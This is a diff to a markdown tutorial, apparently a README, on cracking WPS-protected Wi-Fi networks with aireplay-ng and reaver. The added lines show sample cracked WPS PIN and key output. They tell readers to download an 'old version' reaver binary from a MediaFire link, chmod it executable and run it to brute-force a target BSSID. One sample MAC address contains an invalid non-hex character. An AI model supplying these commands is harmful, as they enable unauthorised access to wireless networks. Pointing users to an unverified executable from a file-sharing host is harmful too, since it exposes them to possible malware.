@@ -349,8 +349,38 @@ no-associate - to tell reaver no to associate with the target network
 ```
 aireplay-ng --fakeauth 30 -a 70:97:41:DA:E0:5B -h 48:5D:60:45:G6:25 wlan0mon
 ```
+you see that wps pin is password:
+> WPS PIN : '12345670' <br>
+> WPS PSK : 'UAURWSXR' <br>
+> AP SSID : 'Test_AP' <br>
+
 -a - target MAC Address <br>
 -h - interface MAC Address
+<br>
+
+
+
+**Error:**
+Now getting an error and this is actually a bug with the last versions of reaver
+
+**Solution:**
+Use older version of reaver. it's work perfectly <br>
+
+> [Download reaver](https://www.mediafire.com/file/9mjizwkeru2qf7x/reaver/file) - old version <br>
+> change dirctory to download
+> change the permission of this file to an executable
+```
+cd download
+chmod +x reaver
+```
+> using *reaver* old version to do the brute forcing and cracking WPS enable network
+```
+./reaver --bssid 70:97:41:DA:E0:5B --channel 1 --interface wlan0mon -vvv --no-associate
+```
+
+
+
+
 
 
 
